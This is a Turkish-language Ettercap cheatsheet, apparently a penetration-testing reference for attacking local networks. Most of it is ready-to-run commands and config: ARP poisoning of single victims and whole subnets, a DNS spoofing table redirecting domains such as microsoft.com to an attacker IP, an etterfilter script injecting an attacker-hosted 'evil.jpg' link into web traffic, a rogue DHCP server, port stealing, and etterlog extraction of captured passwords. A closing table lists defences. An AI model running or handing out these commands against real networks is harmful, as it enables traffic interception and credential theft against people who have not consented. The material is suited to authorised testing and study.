# Ettercap Bilgi Notu (Cheatsheet)

[Ettercap](https://www.ettercap-project.org/), yerel ağlar (LAN) üzerinde Man-in-the-Middle (Ortadaki Adam - MITM) saldırıları gerçekleştirmek, canlı paketleri dinlemek, içeriği anlık olarak filtreleyip değiştirmek ve ağ protokollerini analiz etmek için geliştirilmiş kapsamlı bir sızma testi aracıdır.

---

## İçindekiler

- [Temel Mimari & Çalışma Modları](#temel-mimari--çalışma-modları)
- [Kurulum & Hızlı Yapılandırma](#kurulum--hızlı-yapılandırma)
- [ARP Zehirleme & Paket Dinleme (Sniffing)](#arp-zehirleme--paket-dinleme-sniffing)
- [DNS Spoofing (Yanıltma) Saldırıları](#dns-spoofing-yanıltma-saldırıları)
- [Özel Paket Filtreleme (`etterfilter`)](#özel-paket-filtreleme-etterfilter)
- [DHCP Spoofing & Port Stealing](#dhcp-spoofing--port-stealing)
- [Kayıt Tutma & Bilgi Çıkarma (`etterlog`)](#kayıt-tutma--bilgi-çıkarma-etterlog)
- [Savunma Yöntemleri & Tespit](#savunma-yöntemleri--tespit)

---

## Temel Mimari & Çalışma Modları

Ettercap farklı çalışma kiplerini destekler:
- **`-T` (Text Modu):** Scriptler ve uzak sunucularda terminal tabanlı hafif metin modu.
- **`-C` (Curses Modu):** X11 grafik arayüzü gerektirmeyen etkileşimli ncurses menü arayüzü.
- **`-G` (GTK Modu):** Tam grafiksel kullanıcı arayüzü.
- **`-D` (Daemon Modu):** Arka planda sessiz çalışan servis modu.

Hedef tanımlama sözdizimi:
```text
/MAC/IPs/IPv6/PORTs
```
- Virgülle ayrılmış IP veya aralık girilebilir. `//` ifadesi "tüm hedefler" anlamına gelir.
- Örnek: `/192.168.1.50/` -> 192.168.1.50 IP adresindeki tüm portları hedefler.
- Örnek: `//80,443/` -> Ağdaki tüm cihazların 80 ve 443 portlarını hedefler.

---

## Kurulum & Hızlı Yapılandırma

```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical

# Arch Linux / BlackArch
sudo pacman -S ettercap

# Linux çekirdeğinde IP yönlendirmeyi (IP forwarding) aktif edin
sudo sysctl -w net.ipv4.ip_forward=1
```

Kritik yapılandırma dosyaları:
- `/etc/ettercap/etter.conf`: Çekirdek ağ, yetki düşürme ve filtre kuralları.
- `/etc/ettercap/etter.dns`: DNS spoofing tablosu ve yönlendirme kayıtları.

---

## ARP Zehirleme & Paket Dinleme (Sniffing)

### 1. İki Yönlü Uzak ARP Zehirleme (Gateway - Kurban Arası)
Hedef istemci ile ağ geçidi (gateway) arasındaki trafiği araya girerek yönlendirin:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-T`: Metin (CLI) kipi.
- `-q`: Sessiz mod (yalnızca yakalanan kimlik bilgilerini ve parolaları ekrana basar).
- `-i eth0`: Dinleme ve enjeksiyon yapılacak ağ arayüzü.
- `-M arp:remote`: Çift yönlü ARP tablosu zehirleme saldırısı.

### 2. Tüm Alt Ağı (Subnet) Dinleme
Ağdaki tüm istemcileri varsayılan ağ geçidine karşı zehirleyin:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
```

### 3. Pasif Ağ Dinleme (ARP Zehirlemesi Yapmadan)
Saldırgan makineye gelen/geçen düz metin protokol parolalarını tespit edin:
```bash
sudo ettercap -T -q -i eth0
```

---

## DNS Spoofing (Yanıltma) Saldırıları

Ettercap içerisinde yerleşik `dns_spoof` eklentisi bulunur.

### Adım 1: `/etc/ettercap/etter.dns` Dosyasını Düzenleyin
Kurbanın gitmek istediği alan adlarını kendi IP adresinize yönlendirin:
```text
# Alan adını saldırgan makinenin IP adresine yönlendirin
target.corp.local      A   192.168.1.100
*.target.corp.local    A   192.168.1.100
microsoft.com          A   192.168.1.100
```

### Adım 2: DNS Eklentisi ile Ettercap'i Başlatın
```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-P dns_spoof`: DNS zehirleme eklentisini devreye alır.
- Ağ geçidi veya hedef istemcinin yaptığı DNS sorguları saldırgan makineye döner.

---

## Özel Paket Filtreleme (`etterfilter`)

Ettercap, canlı geçen paketlerin yükünü (payload) değiştirebilen özel filtreleme motoruna sahiptir.

### 1. Filtre Scripti Yazın (`replace_img.filter`)
```text
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("img src=", "img src=\"http://192.168.1.100/evil.jpg\" ");
    msg("[*] Görsel bağlantısı başarıyla değiştirildi!\n");
}
```

### 2. Filtreyi `etterfilter` ile Derleyin
```bash
etterfilter replace_img.filter -o replace_img.ef
```

### 3. Derlenmiş Filtre ile Saldırıyı Başlatın
```bash
sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
```

---

## DHCP Spoofing & Port Stealing

### 1. Sahte DHCP Sunucusu (Rogue DHCP Server)
Gerçek DHCP sunucusundan daha hızlı yanıt vererek kurbanlara sahte Gateway ve DNS dağıtın:
```bash
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
```
- Biçim: `dhcp:<ip_havuz_baslangic-bitis>/<alt_ag_maskesi>/<sahte_dns>`

### 2. Port Stealing (Switch CAM Tablosu Taşması)
ARP zehirlemesinin engellendiği anahtarlamalı (switch) ağlarda MAC adreslerini taklit ederek trafiği çalın:
```bash
sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
```

---

## Kayıt Tutma & Bilgi Çıkarma (`etterlog`)

### Yakalanan Trafiği Dosyaya Kaydetme
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
```
- `-w capture.pcap`: Ham pcap paketlerini kaydeder.
- `-L ettercap_log`: Ayrıştırılmış metin loglarını üretir.

### `etterlog` ile Bilgileri Ayrıştırma
```bash
# Yakalanan tüm kullanıcı adı ve parolaları listele
etterlog -p ettercap_log.eci

# Belirli bir TCP akışını PCAP olarak dışa aktar
etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
```

---

## Savunma Yöntemleri & Tespit

| Saldırı Türü | Tespit & Savunma Yöntemi |
|---|---|
| **ARP Zehirleme** | Switch seviyesinde Dynamic ARP Inspection (DAI) aktif edilmeli, `arpwatch` veya `arpon` ile çift MAC alarmları izlenmelidir. |
| **DNS Yanıltma** | DNSSEC, DoH (DNS-over-HTTPS) veya DoT (DNS-over-TLS) protokolleri zorunlu kılınmalıdır. |
| **DHCP Spoofing** | Anahtarlarda DHCP Snooping yapılandırılarak yalnızca güvenli portlardan DHCP Offer paketlerine izin verilmelidir. |
| **Port Stealing** | 802.1X Port Güvenliği (Port Security) ile her porta tek bir güvenilir MAC adresi bağlanmalıdır. |
